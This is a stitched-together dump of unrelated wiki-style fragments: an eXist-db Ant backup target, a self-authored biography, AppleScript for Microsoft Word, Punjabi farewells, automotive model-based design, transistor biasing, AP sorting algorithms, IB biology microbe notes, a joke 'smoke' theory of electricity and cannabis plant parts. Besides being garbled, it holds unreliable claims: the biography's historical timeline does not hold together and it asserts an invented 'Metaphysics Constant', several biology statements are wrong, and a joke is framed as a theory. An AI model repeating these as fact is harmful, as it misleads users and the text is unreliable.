Many databases provide Apache Ant tasks that have functions that extract and store operations.

Here is a sample Apache ant target that does an extract on a local file and stores it on a remote file.
&lt;source lang=&quot;xml&quot;&gt;
&lt;target name=&quot;push-bananas&quot;&gt;
      &lt;xdb:extract 
         xmlns:xdb=&quot;http://exist-db.org/ant&quot; 
         uri=&quot;xmldb:exist://${local-host}/exist/xmlrpc/db/test/sync&quot; 
         resource=&quot;bananas.xml&quot; 
         destfile=&quot;C:/backup/db/test/sync/bananas.xml&quot;
         user=&quot;${local-user}&quot;
         password=&quot;${local-pass}&quot;
      /&gt;
      &lt;xdb:store 
         xmlns:xdb=&quot;http://exist-db.org/ant&quot; 
         uri=&quot;xmldb:exist://${remote-host}/exist/xmlrpc/db/test/sync&quot; 
         srcfile=&quot;/backup/db/test/sync/bananas.xml&quot; createcollection=&quot;true&quot;
         user=&quot;${remote-user}&quot;
         password=&quot;${remote-pass}&quot;
        /&gt;
     &lt;/target&gt;
&lt;/source&gt;

Note that the the following properties must be set in this Ant file.

&lt;source lang=&quot;xml&quot;&gt;
   &lt;property name=&quot;local-host&quot; value=&quot;localhost&quot;/&gt;
   &lt;property name=&quot;local-user&quot; value=&quot;admin&quot;/&gt;
   &lt;property name=&quot;local-pass&quot; value=&quot;put-local-pw-here&quot;/&gt;
   
   &lt;property name=&quot;remote-host&quot; value=&quot;example.com&quot;/&gt;
   &lt;property name=&quot;remote-user&quot; value=&quot;admin&quot;/&gt;
   &lt;property name=&quot;remote-pass&quot; value=&quot;put-remote-pw-here&quot;/&gt;
&lt;/source&gt;

      <text xml:space="preserve">Biography

In 1966, Luke Eric Lafreniere was born in a small city called Hull in a wonderful bilingual province, the Province of Quebec in Canada. However, his dad named, Leo Lafreniere, was born, the 30th of July 1944 in a tiny village called Gracefield. His dad and mom were baby boomers. This small country town is approximately eighty miles from where his son Luke was born. It is a fact that his dad married a woman of the city named Nicole Parent during the summer of 1965. A short time after, Luke Eric came to this world at the Sacré-Coeur Hospital, the o4th of May 1966 in the evening. Actually, he became the first born of the family. According to the will of his family, it will take years for him to perfect his education. It is also true that his spiritual awakening starts in his youth age. Actually, his dad offers him for his 19th birthday his first Bible. This Bible changes his life forever. Fortunately in the Lafreniere family, a great moment arrived, December 05th 1967, Leo and Nicole gave birth to a beautiful girl that they called Josée. Luke’s only sister was named Josée Lafrenière.  It was extremely important in the Lafreniere family, like all other families, that Luke and Josée received a great education.  So, he starts his primary education in 1972 in a downtown primary school in Hull called Lac des Fées because of a lake named like this. He and his sister went in the same primary school for six years. Because of his Mom, the place where she wants her only son and daughter to go was a private college. This private college was located in Limbour, near Gatineau and was called St-Alexandre College. Probably, name after the great Alexander, the famous Hellenistic Emperor. This private college issued him his first high school diploma in June 1983. At that time, Luke was a normal average student.  He loves more humans sciences because of his own personality. He wishes that he could say that sciences was his passion, but sports was really his only real passion in high school. 
Unfortunately, he was an emotional kid then a logical student. Elegantly, he had to follow is emotional pattern and feelings. So, he graduated in May 1985 in social sciences. In Quebec, C.E.G.E.P. is the equivalent of a 13th grade in Ontario and all other provinces in Canada. At this public College, his passion for sports prevailed. There, he was practicing basketball, softball, handball, windsurfing, diving and trampoline. Luke Eric Lafreniere was always very athletic. Spiritually, at that time he was so far away until the age of 19. He loves skiing in the winter, specially freestyle skiing. In the summer, he decided after graduated in college that he wanted freedom. So, on his own decision, he left his family for Montreal city where he was accepted in University in the field of International relations and Politics. Montreal University, the same place were Jacques Parizeau, ex-Prime Minister of Quebec was teaching economics in the H.E.C. M. Parizeau in that period was a simple University teacher, and after became the actual  Minister of Finance in the famous Prime Minister of Quebec, René Lévesque. Pierre E. Trudeau was the Prime Minister of Canada at this time. Over there, Luke assists to some courses in International politics with the great French economist, Pierre Fortin. He only stays in Montreal for a year. Probably the most important thing in Montreal, he began to evangelise the University students inside the walls of Montreal University. He preached the Gospel of Christ with a role model Christian friend that looks physically like Christ. Fortunately, he achieved his personal independence there in a way by the simplicity of preaching the Gospel.
However, for a reason of high cost, he returned to his family in Gatineau in 1987. So, he registered himself in September 1987 in business and administration at the University of Hull in Gatineau, Quebec. In his first year, he quits because of the aridity of accounting that he thought it was a night mare. At the end of this first year, he decided because of his love for children, to considered doing a teaching degree at this same University. Unfortunately, bad University teacher do exist. Sadly, this teacher told him that he was a real failure in pedagogical teaching. And because of this university teacher, he had believed these false rumours and accusations, so he decided to end his teaching career after almost 3 years in this U.Q.O. University. Sadly, he never received his Quebec licence in teaching. Most people would had stop studying after this, but not him. In 1989, the second most important thing arrived in his life, he met his wife, Sylvie Tremblay, in church. Luke was married the 22nd of July, 1989. For him, the most important thing in his own life was the discovery of Jesus-Christ. At the age of only 19 years old, he became a Christian. It was not going so well at University, and his dad  had is own construction business. His dad offers him a position in sales in his family business, so he can take care of his own family. Fortunately in 1999, Luke went back to college school to finished his pure sciences
likes maths, physics,  and chemistry but this time he graduated with honours.
During the summer of 1996, the most happiness event occurs in the life of Luke and Sylvie Lafreniere. The 09th at 8:20(p.m.) was born her unique daughter, Noémie Lafreniere. In 2001, after this bad experience at the University of Quebec in Hull, he decided with his sales experience to started a 2e cycle degree in management for his masters. He graduated with honours, the 21st of Feb. 2003, 15 credits in management. After this small victory, he didn’t have a job because his dad declared bankruptcy.  Sadly, he didn’t finished his masters in management because of money problems. But, it is during that hole period without no job, no salary, and  no money to finished University that Luke wrote his first book:’’ Concepts of Modern Geometry’’
In this book, he explains clearly the Metaphysics Constant. His only determination in the Academic world now, his to present his thesis. Maybe one day, he will be honour with a .phd ‘’honoris scosa’’
because he is the one that invented the first Metaphysics Constant in 2006.
In 2009, he enters has a free auditor at St-Paul University, one of the most popular Catholics University of Canada. In his first course, he presents his thesis in French to his teacher. The only benefits of this course was that her teacher read his thesis and translated his mathematical formulae in Greek.
April the 15th of 2009, he wrote a small biography in a virtual encyclopaedia on the web named wikibooks.He hopes that his book will be ready in English for 2017.Now, Luke Eric Lafreniere is the ceo of SINCAN PETROLEUM CORPORATION OF CANADA in crude oil.Authorize biography.

      <text xml:space="preserve">Microsoft Word 2008 and its Office brethren are a completely different animal when it comes to scripting. The majority of the code needed to script Word comes from the same object hierarchy as the (at the time of this writing) dead Visual Basic for Mac.

The script below creates a new Word document, and inserts predefined text. Then the text is formatted.


--This is just where we define our variable fiHR and could be returned from any interview or picked up and parsed through an external program. We have cheated a bit by using AppleScripts built in language to pre-format our text, however AppleScript, itself, knows nothing about text styling (bold, fonts etc.) applications like Text Edit and MS Word do though.

&lt;code&gt;set fiHR to &quot;Facts&quot; &amp; return &amp; return &amp; return &amp; return &amp; &quot;Issue&quot; &amp; return &amp; return &amp; return &amp; return &amp; &quot;Holding&quot; &amp; return &amp; return &amp; return &amp; return &amp; &quot;Rationale&quot;&lt;/code&gt;

--telling Microsoft Word to startup and come to front

&lt;code&gt;tell application &quot;Microsoft Word&quot;
	activate&lt;/code&gt;

--telling MS Word to create a new document, as opposed to &quot;active document&quot;
	
&lt;code&gt;create new document&lt;/code&gt;

--this defines the area for all of the text of the new document, start 0 end 0 captures the whole doc, with existing docs you could call out words, characters, lines in paragraphs etc. 
	
&lt;code&gt;set myRange to create range active document start 0 end 0&lt;/code&gt;

--now we are setting what the contents of text, for the whole document (myRange), should be, by calling our variable (fiHR) which we have previously defined
	
&lt;code&gt;set content of myRange to fiHR&lt;/code&gt;

--this line sets our cursor/insertion point to the end of our text. it could be set to a character, word, line paragraph etc. Story is everything we have typed into the new doc. We do this, because we want the formatting to apply to all of the text typed in from our variable.
	
&lt;code&gt;set myRange to change end of range myRange by a story item ¬
		extend type by selecting&lt;/code&gt;

	--begin formatting the text fiHR by setting the font and the styling of the font
	
&lt;code&gt;set name of font object of myRange to &quot;Arial&quot;&lt;/code&gt;
	
&lt;code&gt;set italic of font object of myRange to true&lt;/code&gt;

	--telling Microsoft Word that we are done bossing it around for now. We have not saved nor closed this doc, but that could be added too.

&lt;code&gt;end tell&lt;/code&gt;

=== Other parting greetings ===

In the above dialog Rajesh takes leave of his teacher Sohan Singh by saying 
Sat Sri Akal (ਸਤਿ ਸ੍ਰੀ ਅਕਾਲ) which signals that Rajesh is departing. 
This is same as the greeting when they met. Here again there are cultural variants. 
A Hindu can use Namate or Namaskar (ਨਮਸਤੇ or ਨਮਸਕਾਰ) and a Sikh may say 
Rab Rakha (ਰੱਬ ਰਾਖਾ) and a follower of Islam Khuda Hafiz (ਖੁਦਾ ਹਾਫਿਜ਼).

      <comment>/* Model based design */  Motivation of changes in cross sectional issues added</comment>
      <text xml:space="preserve">= Model based design =

The model-based development of a modified functionality or a new functionality generally follows the same development stages.
This part is specifically for automotive applications, but should be pretty much the same for all systems
•	First stage: functional design
The functional description of the system is translated into a model of the software functions. This model should represent the operation of the end-program with the inputs and outputs the implemented system will receive. 
This model used to be represented by written software specifications. This approach has as major drawback that it is not easy to couple the written specifications-model to the models available for other subsystems in cars, since these are modeled in another language. Therefore the trend is to construct the functional model in a general description language like block diagrams or finite state machines (link wikibook), by use of eg. Simulink. This enables the designer to link the software-model to models of the other sub-systems of the vehicle. These subsystem-models could be implemented in Simulink as well, or could be modeled in a specific program that provides a Simulink interface, like VirtualLab from LMS for example. 
Usually these vehicle models are kept as simple as possible, and only need to be valid in the target operating range of the system under design. It is obvious that the complexity of the vehicle-model will always be a function of the system under test. A model for designing an adaptive cruise-control will not require a very detailed tire-model, where a model for ESP-design will need just that. If the description is unambiguous it is also possible to use the development software to perform a simulation on this functional model. No hardware decisions are made yet in this stage.

•	Second stage: rapid prototyping
During this stage the functional model of the program will be tested on an actual prototype. To be able to perform this test, the development-software has to be able to convert the model to a runnable program. The newly developed or adapted software functions are then connected to the setpoint generators, sensors and actuators in the vehicle. To enable this connection, the program should be able to run real-time. This demands considerably more computing power than standard ECU’s since the generated code will still be un-optimized. How the new program is connected to the existing systems is dependent on wether it is a modification of an existing functionality or the design of an entirely new function. 
If the prototype is meant to test a modification of an existing functionality, then a “bypass” connection will be used (figure bosch). In this case there should be an ECU that runs the basic program, receives all the inputs, sends all the outputs and has a bypass interface which can be connected to the experimental system. The software on the ECU should also support the possibility of sending data to the experimental system and substituting the ECU-outputs with those from the experimental systems. The software modifications required are called “bypass-hooks” (source Bosch). This method is also advisable if the ECU for the system under test has complex I/O processing, eg for an engine ECU, because it would be unwanted to program these processing protocols all over again. 
If the purpose of the prototype is to test an entirely new function, normally a “fullpass” system is used. In case there is no other ECU required, and the experimental system takes care of all the I/O and processing functions. This also means that the experimental system should be able to communicate with all the necessary setpoint generators, sensors and actuators. 

•	Third stage: Implementation
In this stage the actual hardware for the vehicle is chosen (more info on hardware? Wikibook? Here?). This determines extra constraints and requirements for the function. The program has to be implemented for this exact type of hardware to work as optimal as possible, so that the most economical hardware setup can be used.
In the past this programming always had to happen by hand, which was very time-consuming and rather error-prone. Nowadays however, more and more developers are introducing development programs which are able to do an automatic optimal compilation of the program based on a given hardware configuration. This obviously saves a lot of development-time and makes iterations in or after this stage much easier and faster. 
This is also the stage where all the requirements have to be taken into account, going from real-time behavior, to reliability to diagnostic possibilities. (is niet echt all the requirements)
Since all the electronic systems in the vehicle are being developed in parallel, it is also crucial that all the communication is well implemented in this stage. This is currently one of the most time-consuming activities, due to a lack of standardization of communication between ECU’s. 

•	Fourth stage: integration and testing
This is the stage where all the individual components are synchronized. The entire vehicle system is tested in a protected environment like test-benches and hardware-in-the-loop (HIL, Wikipedia). After this stage, there shouldn’t be any major bugs in the system anymore. One of the main problems during this part of the development is the choice of test cases, and what tests reveals flaws the best.

•	Fifth stage: calibration of software functions
In this final stage, the final ECU-parameters are calibrated. Because not every parameter can be determined through laboratory testing, the final fine-tuning has to happen on the actual vehicle. Some calibration, like engine-calibration, can happen on test-benches as well though. 
This calibration can happen off-line, but this has the disadvantage that the operation of all the components has to be interrupted to update the system-parameters. The alternative is to perform an online-calibration. With online-calibration, the parameters can be adjusted while all the microcontrollers are running. This does place higher stability demands on the system.

=Motivation of changes in Cross-sectional issues=

The deleted sections: communication, quality, resources contained no information relevant to the design process. A lot of information could also be found at wikipedia. Unless you can give clear advice, i.e. do's and don't's, about them in regard to system design there shouldn't be a section of them.

In the late design commitments section the text was improved (say more/the same with fewer words).</text>

      <text xml:space="preserve">What do we mean by &quot;bipolar&quot; here?  The word has lots of uses, and even is part of the &quot;official&quot; name of the most common type of transistor, [[Bipolar Junction Transistor]]s (BJTs). In our present context think of waves of sound coming to your ear... pressure will increase compared with normal during part of each cycle, and decrease during the other half.  The simplest of transistor circuits will have a single power supply, perhaps positive (usually for [[NPN]] transistors) so it can make the output signal go positive to varying degrees, but how could it make it go negative when needed for the rest of the signal waveform?  Looking at circuits for [[common emitter]] and [[common collector]] amplifier configurations (the jargon isn't all that important - let's just say: both of the most frequently used simple circuits!) it should be clear the circuit simply cannot drag the output voltage down any lower than the negative side of the battery, which is connected to &quot;ground&quot; (the &quot;zero&quot; volts reference point for signals).  If we used a [[PNP]] transistor and a negative power supply, we would still only be able to handle half of the signal, this time the negative half.

One idea is to have two transistors and two power supplies (one positive, one negative), with each half of the cycle being handled by, in effect, a different amplifier.  This is called [[push pull]] and is common in many power amplifiers to drive loudspeakers, for instance.  But it is easier said than done! How do you connect the outputs of both amplifiers so one has control on the positive half of the wave but not the other, without the two &quot;fighting&quot; over what the output should be or passing wrong polarity currents through the other transistor that might damage it?  There are solutions, but they are not entirely simple.  Let's come back to them later, and think about easier solutions.

What about &quot;redefining&quot; zero on the signal to be half way between the power supply rails?  It is something of what was going on with push-pull anyway, but we could do it with one transistor. We add some voltage (or better talked of in terms of current for BJT transistors) to have the transistor half on with no signal, so positive signal turns it more on, negative parts of the wave tends to...

      <text xml:space="preserve">This page should relate to the previous page about a very simple amplifier, but that has not been created yet.  So take this page as merely setting down in words some ideas that could follow, the basis for the germ of an idea for the &quot;proper&quot; page about biasing transistors to handle thje ups and downs of signals!

I probably should not have introduced the ideas of PNP and NPN (except I have to make it clear that a positive OR a negative signal could be handled using the &quot;simplest&quot; amplifier - that still has not, itself, been given!). I really should not have mentioned common emitter and common collector.  In fact, readers with some experience will know it is very, very easy to make a common emitter amplifier that handles positive and negative signals with one transistor!  But then the aim of the article, to introduce biasing, is missed.</text>

      <text xml:space="preserve">Sorting and searching are two commonly used operations in computer science.  For the AP exam, you will be required to know certain methods of sorting through collections, called '''sorting algorithms''', as well as certain ways of searching for given items in collections, called '''searching algorithms'''.

== Sorting ==
There are many common algorithms used for sorting through collections.  Here are some important ones to know:

=== Selection Sort ===

Selection sort is an iterative sort algorithm that uses a &quot;search and swap&quot; approach to sort a collection.  For each pass through the collection, the algorithm finds the smallest element to be sorted and swaps it with the first unsorted element in the collection.  The algorithm continues in this manner, finding the next smallest element in the collection and swapping it with the next unsorted element.  Finally, when just two unsorted elements remain, they are compared (and if necessary, swapped) and the sort is complete.  

==== Efficiency ====

The efficiency of the selection sort algorithm and the number of comparisons made do not depend on the initial order of the elements in the collection; the same number of comparisons is made, regardless of initial order.  For a collection of ''n'' elements, the collection is sorted after ''n-1'' passes.  After the ''k''th pass, the first ''k'' elements have been sorted and are placed in their final sorted positions.  In the ''k''th pass, ''n-k'' comparisons are made.  The total number of comparisons made after the sort is complete is ''n(n-1)/2''.  The selection sort algorithm has an efficiency of ''O(n&lt;sup&gt;2&lt;/sup&gt;)'' in the best, average, and worst cases.  In other words, there is no best or worst case for selection sort; every case is considered average.

=== Insertion Sort ===

Insertion sort is also an iterative sort algorithm.  When using this algorithm, the first element is &quot;sorted&quot; with respect to itself.  The algorithm then takes the second element and compares it with the first, inserting it in front of the first one if necessary.  From this point forward, the algorithm takes the next unsorted element and compares it with the sorted elements, inserting the element in the correct position as needed.  The algorithm continues in this manner, shifting sorted elements as needed to make room for the next element to be inserted.

==== Efficiency ====
The efficiency of the insertion sort algorithm and the number of comparisons made do depend on the initial order of the elements in the collection.  For an array of ''n'' elements, the array is sorted after ''n-1'' passes.  The efficiency differs in the best, average, and worst cases.
* The best case for insertion cases occurs if the collection is already initially sorted in order.  Each pass through the array will require only one comparison, which will indicate that the element being compared is already in its correct position with respect to the sorted list.  No elements will need to be moved.  The total number of comparisons made is ''(n-1)''.  In this case, the insertion sort algorithm has an efficiency of ''O(n)''.
* The worst case for insertion sort occurs if the collection is initially sorted in reverse order, which will result in the maximum possible number of comparisons and moves being needed to sort the collection.  After the ''k''th pass, the first ''k+1'' elements are sorted with respect to each other but are not placed in their final sorted positions.  In the ''k''th pass, ''k'' comparisons are made.  The total number of comparisons made after the sort is complete is ''n(n-1)/2''.  In this case, the insertion sort algorithm has an efficiency of ''O(n&lt;sup&gt;2&lt;/sup&gt;)''.

=== Mergesort ===

Mergesort is a recursive algorithm that uses a &quot;divide and conquer&quot; approach to sorting collections.  Each time the algorithm is called, the algorithm checks to see if there is more than one element in the collection, and if there is, the collection is &quot;broken&quot; into two halves.  If there is even number of elements, the halves are equal, but if there is an odd number of elements, the left half will contain one more element than the right half.  At this point, the algorithm uses recursion, calling itself to first mergesort the left half of the collection, then mergesort the right half.  When the algorithm calls itself to mergesort one of the halves, it again &quot;breaks&quot; the half into two halves, then calls itself to sort each half.  This process is repeated until the entire collection is &quot;broken&quot; into individual elements, or subcollections of length 1.  When the method calls itself to sort one of these, the initial test that sees if there is more than one element in the subcollection fails, since there is only one element in the subcollection.  This is where the recursion stops, and the algorithm returns to sorting the half by comparing the two adjacent elements, sorting them, and then recombining them into a sorted subcollection.  This process continues until all of the individual elements have been sorted and recombined into sorted subcollections.  Then the subcollections themselves are compared, sorted, and recombined.  This process continues until the subcollections have been recombined to form two sorted halves.  Finally, the left and right halves are compared to each other, sorted, and recombined to create the final, fully sorted collection.

==== Pseudocode ====

Here is a pseudocode representation of the mergesort algorithm:

&lt;pre&gt;&lt;nowiki&gt;
If there is more than one element in the collection
     Break the collection into two halves
     Mergesort the left half
     Mergesort the right half
     Compare the two halves
     Merge the two subcollections into a sorted collection
&lt;/nowiki&gt;&lt;/pre&gt;

==== Efficiency ====

The efficiency of mergesort is not affected by the initial ordering of the elements.  Because mergesort requires the use of temporary collections that are as large as the collections to be sorted, it should not be used if only limited memory space is available.  This algorithm consists of multiple parts:
* The part of the algorithm that merges the subcollections first compares each element in the subcollections, which is an ''O(n)'' process, then copies the elements from the temporary collection back into the original collection, which is also an ''O(n)'' process.  This makes the actual merging of the algorithm requires a total of ''2n'' operations, making this part of the algorithm an ''O(n)'' process. (Remember that constants are ignored in Big-O notation.)
* The &quot;breaking&quot; of the collection of ''n'' elements into ''n'' subcollections of one element each requires log&lt;sub&gt;2&lt;/sub&gt;''n'' divisions, which is an ''O(''log''n)'' process.
Remember that for each division of the collection into subcollections, the merging part of the algorithm must be called.  This makes the mergesort algorithm have an efficiency of ''O(n''log''n)'' in the best, average, and worst cases.  In other words, there is no best or worst case because every case is considered average.

=== Quicksort ===

Quicksort is, on average, the fastest sorting algorithm for sorting collections with a large number of elements.  Quicksort is recursive and also uses a &quot;divide and conquer&quot; approach to sorting.  This algorithm starts by partitioning the collection, selecting a pivot point, which is usually either the first element in the collection or an element selected at random, then moving all elements less than the pivot point value to the left of the pivot point, and all elements greater than or equal to the pivot point value to the right of the pivot point.  The algorithm then uses recursion, splitting the array into two halves and calling itself to quicksort each half.  Finally, the sort is complete when every element has been moved to its correct location.

==== Pseudocode ====

Here is a pseudocode representation of the quicksort algorithm:

&lt;pre&gt;&lt;nowiki&gt;
If there are at least two elements in the collection
     Partition the collection
     Quicksort the left collection
     Quicksort the right collection
&lt;/nowiki&gt;&lt;/pre&gt;

== Searching ==

'''Linear Search'''
Involves going through each element of a collection until the appropriate value is found.  This is often implemented using a simple for loop, where you begin at index 0 and count up to the last index in the collection.  This is the simplest search method, and becomes less effective if the collection is very large.

'''Binary Search'''
Involves going through a collection and comparing the middle index against the value.  This requires a sorted collection in order to work.

For Example: You are trying to find the number 12 in an array of 100 integers, with values equal to the index+1 (1,2,3,4,5,..,99,100).  Notice that this array is sorted with the smallest values on the left and the largest at the right.  You would compare the middle value (50) against the search value (12).  Since 50&gt;12, you would exclude all the values 50 to 100 since they are also greater than the search value.  You would then check 25 against the search value since that is the new middle between 49 and 1.  Once again this value is larger than the search term and so all number 25 to 49 are excluded.  This process continues until you finally arrive with 12 as the center value.

please see the link for the diagram

'''F.2.3 State the roles of ''Rhizobium, Azotobacter, Nitrosomonas, Nitrobacter'' and ''Pseudomonas denitrificans'' in the nitrogen cycle.'''
:*Nitrogen Fixation
::*Mutalistic: ''Rhizobium'' lives in symbiosis with legumes (its root nodules) and fixes nitrogen for them
::*Free-living: ''Azotobacter'' fixes nitrogen and lives freely in the soil without a host
:*Nitrification
::*''Nitrosomonas'' converts ammonia (NH&lt;sub&gt;3&lt;/sub&gt;) into nitrite (NO&lt;sub&gt;2&lt;/sub&gt;-)
::*''Nitrobacter'' changes nitrite into nitrate (NO&lt;sub&gt;3&lt;/sub&gt;-) which is usable by plants

:* Nitrate Fertilizer
::* Rivers leech off nitrate from soil =&gt; if application of nitrate fertilizer is great enough, eutrophication occurs =&gt; algae proliferate (increasing oxygen levels) =&gt; if nitrate levels in excess, algal bloom occurs =&gt; due to large amount of algae, some are deprived of sunlight and die =&gt; saprotrophs are needed to break down the organic matter =&gt; this creates a biochemical oxygen demand (BOD) =&gt; deoxygenation occurs =&gt; oxygen-dependent organisms are forced to emigrate/die=&gt; increase in ammonia and phosphorus levels =&gt; nitrification =&gt; eutrophication =&gt; algae proliferate =&gt; provided no new algal bloon occurs, river recovers eventually.

:* Simpler Module:
::*High and excess nitrates and phosphates fertilize the algae in water
::*Increased growth of algae (algal bloom)
:*Algae decomposed by aerobic bacteria which use up oxygen in water, resulting in deoxygenation
:*The high use of oxygen is called biochemical oxygen demand (BOD)

'''F.2.6 Outline the role of saprotrophic bacteria in the treatment of sewage using trickling filter beds and reed bed systems.'''
:*Trickling Filter System
::*Bed of stones 1-2 meters wide
::*A biofilm of aerobic saprotrophs are on the rocks, which feed on organic mater, cling to the stones and act on the sewage trickled over (this is done to aerate the sewage), until it is broken down.
::*Cleaner water trickles out the bottom of the bed to another tank where the bacteria are removed and the water treated with chlorine to disinfect it
:*Reed Bed System
::*Artificial wetland used to treat waste water
::*Waste water provides both the water and nutrients to the growing reeds
::*The reeds are harvested for compost and the organic waste is broken down by saprotrophic bacteria
::* Nitrification of ammonia to nitrite and nitrite to nitrate
::*Nitrates and phosphates released are used as fertilizer by the reeds
::* Remaining nitrates are denitrified

'''F.2.7 State that biomass can be used as raw material for the production of fuels such as methane and ethanol.'''
:* Biomass (organic matter) can be used as raw material for the production of fuels such as methane and ethanol. Examples include manure and cellulose.

'''F.2.8 Explain the principles involved in the generation of methane from biomass, including the conditions needed, organisms involved and the basic chemical reactions that occur.'''
:*One group of Eubacteria are needed to convert the organic mater into organic acids and alcohol
:* A second group of Eubacteria convert these into acetate, carbon dioxide and hydrogen
:*Methanogenic bacteria are needed to create the methane, by two chemical reactions:
::* carbon dioxide + hydrogen -&gt; methane + water
::* acetate -&gt; methane + carbon dioxide (breakdown of acetate)
:*Conditions required:
::*No free oxygen (anaerobic)
::*Constant temperature of about 35°C
::*pH not too acidic

:*Reverse transcriptase makes a DNA copy of itself
:*DNA of virus injects into nucleus and integrates into the DNA of the host cell
:*Can be used to remove introns from DNA 
::*Conversion of mRNA (made from DNA and with introns removed) to cDNA after extracted

'''F.3.3. Distinguish between somatic and germ line therapy.'''
:*[[Somatic]]: consists of replacing bodily cells.
::*Defective gene in a somatic cell is corrected.
: Affected individual is cured but he can still can pass the defective gene to his offspring.
:*[[Germ-line therapy]]: consists of treating the gametes
::*Defective gene in a germ cell(egg or sperm) is corrected.
: Affected still has the disease but he can not pass on this to his offspring.

'''F.3.4 Outline the use of viral vectors in gene therapy.'''
:*Viral vectors take out harmful genes and put the normal genes in the cells
:*Retroviral therapy has more permanent change and work better
:*SCIDS
::*First successful example of gene therapy
:::*Replaced gene allows for the production of ADA(Adenosine Deaminase)

'''F.3.5 Discuss the risks of gene therapy.'''

::* Rely on host's metabolism for certain of metabolic processes.
::*Live within the epithelial cells of that line the genital tract
::*Does not produce toxins nor directly damage cells, but can cause long-term problems (such as pelvic inflammatory disease or infertility)
::*Is not targeted by the immune system due to its hidden nature
:*Extracellular Bacterium - ''Streptococcus''
::*Lives inside the host, but in the intercellular spaces and use the nutrients available there.
::*Produces toxins and damage cells.
::*''Streptococcus'' produces toxins that kill host cells and molecules called invasins which split open and dissolve host cells
::*Is targeted immediately by the immune system and antibodies are made to fight the infection

'''F.6.3 Distinguish between endotoxins and exotoxins.'''
:*Endotoxins
::*Lipopolysaccharides (heat-stable) in the walls of Gram-negative bacteria that cause fever and aches.
:*Exotoxins
::*Specific proteins secreted by bacteria that cause symptoms such as muscle spasms (tetanus) and diarrhea.

'''F.6.4 Evaluate methods of controlling microbial growth by irradiation, pasteurization, antiseptics and disinfectants.'''
:*Irradiation
::*Ionizing radiation
:::*Some microbes are resistant (e.g. ''Clostridium botulinum'')
:::*Free radicals may alter the flavour
:::*Some consumers are afraid to use products of 'radiation'
:*Pasteurization
::*Application of high temperature, which is very quickly cooled down and repeated.
:::*Very effective, can kill all pathogens if done at high enough temperatures at long enough periods
:::*Usually, however, this is not done as it alters the flavour of e.g. milk
:*Antiseptics
::*Kill/prevent microbial growth; prevent infection
::*Mild chemicals that are less effective than disinfectants but not damaging to skin and mucous membranes
::*Too toxic to be taken through consumption
:*Disinfectants
::*Extremely effective sterilisation; does not kill endospores, however.
::*Cannot be used on living tissue, nor through consumption.
::*Useful for sterilisation of medical tools, floors, furniture, etc

'''F.6.5 Outline the mechanism of the action of antibiotics, including the inhibition of synthesis of cell walls, proteins and nucleic acids.'''
:*Antibiotics - antimicrobial agents produced by microbes which inhibit or kill other microbes
:*Cell wall synthesis inhibition (e.g. Penicillin)
::*Antibiotics inhibit the production of peptidoglycan for the cell walls of bacteria
::*Without cell walls, the new bacteria cannot survive
:*Protein synthesis inhibition (e.g. Erythromycin, Streptomycin)
::*Block some stage of protein synthesis by attacking the bacterial ribosomes.
::*Does not attack the ribosomes of human cells because bacterial ribosomes (70S) differ from those of humans (80S)
::*Nucleic acid inhibition (e.g. Rifampin)
::*Affect the synthesis of DNA/RNA or attach to DNA/RNA so that they cannot be read
::*Interferes with the growth of bacterial cells

'''F.6.6 Outline the lytic life cycle of the influenza virus'''
:#Virus attaches to cell surface by means of specific receptors (e.g. glycoproteins)
:#Virus is taken up in membrane-enclosed endosome during endocytosis
:#Uncoating occurs in endosome and viral RNA (genome) is released into the cytoplasm
:#RNA of viral genome transported into the nucleus, where it is copied and replicated by the viral enzyme into RNA, acting as  template for more RNA and a messenger
:#Some RNA transported into cytoplasm and translated into viral proteins which are transported back into the nucleus to assemble the capsid
:#Viral envelope proteins assemble in cell membrane and the capsid buds off of these points, using the cell membrane as its envelope
:#Lysis, or the bursting of the cell, occurs and releases new virus particles to attack other cells.

'''F.6.7 Define epidemiology.'''
:* Epidemiology is the study of the occurrence, distribution and control of disease.

'''F.6.8 Discuss the origin and epidemiology of one example of a pandemic.'''
:*Spanish Flu of 1918
::*Killed 40-50 million people
::*Origin believed to be in China
::*Travel of soldiers for WWI aided spread of flu
::*Hang washing encouraged, public gathering banned

'''F.6.9 Describe the cause, transmission and effects of malaria, as an example of disease caused by a protozoan.'''
:*Cause
::*Four species of the genus ''Plasmodium'' (''falciparum, vivax, ovale, malariae'')
:*Transmission
::*Transmitted from one person to the next by a female ''Anopheles'' mosquito which feeds on human blood (males only feed on plants)
::*Plasmodia reproduce in the gut of the female mosquito
::*Egg sac ruptures and releases cells called sporozoites which travel to the salivary glands
::*Sporozites enter bloodstream with mosquito bite and travel to the liver
::*Develop in liver cells, which change form, and then invade red blood cells
::*Another ''Anopheles'' female mosquito feeds on an infected individual, transferring ''Plasmodium falciparum'' into the gut of &quot;Anopheles&quot;.
:*Symptoms/Effects
::*Presents as symptoms of anemia, bouts of fever chills, shivering, joint pain, and headache.
::*Cycle begins again when new mosquito bites a person infected with malaria.

'''F.6.10 Discuss the prion hypothesis for the cause of spongiform encephalopathies.'''
:*States that the causal agent for spongiform encephalopathies in humans has no nucleic acid and consists only of misfolded proteins (PrP&lt;sup&gt;SC&lt;/sup&gt;).
:*The infecting agent is a prion and the abnormal protein alone causes the disease.
::*Scientists have not found any nucleic acids in prion particles.
:*Abnormally shaped prions that can cause normal proteins (PrP&lt;sup&gt;C&lt;/sup&gt;) to change to an abnormal shape, resulting in cell death.
:*Chronic, degenerative diseases of the nervous system that form holes in brain tissue (hence the name), causing symptoms such as memory loss, personality changes, speech lapses and ultimately death.
:*Examples include scrapies in sheep, BSE in cattle and CJD in humans.

      <text xml:space="preserve">I propose a new theory of electricity. The Ervolino Theory of electricity is that electricity flows on smoke therefore all electrical devices run on smoke. Hence if you let the smoke out they no longer work.So it only goes to say that if you could capture the smoke and put it back in it would begin working again.As proof of this theory take any electric appliance and cause it to loose it's smoke and I can say in most cases if enough smoke gets out it will stop working.

== Parts of the Plant ==
This section is added for the curious who don't know much about marijuana and how it is used. The entire plant contains the psychoactive ingredients which include Delta-9 THC and many cannabinoids that give each plant its own unique profile of properties and effects. However, not all parts contain them in the same concentrations.

=== Flowers ===
The flowers or Buds of the plant contain the highest concentrations of plant resin which in turn contains the highest concentration of active ingredients. The unpollinated flowers of the female plants are the part of the plant that is used by recreational users because they produce copius amounts of potent plant resin in order to try to catch pollen. Marijuana is one of the few plants today that actually is split by gender and has distinct separate male and female plants. Female plants do not pollinate themselves in the absence of males but do contain the genetic capability to produce male flowers and may do so under stress. There are also hermaphrodite plants that produce both male and female flowers. Male plants and male flowers are not very potent and are not used recreationally

=== Leaves ===
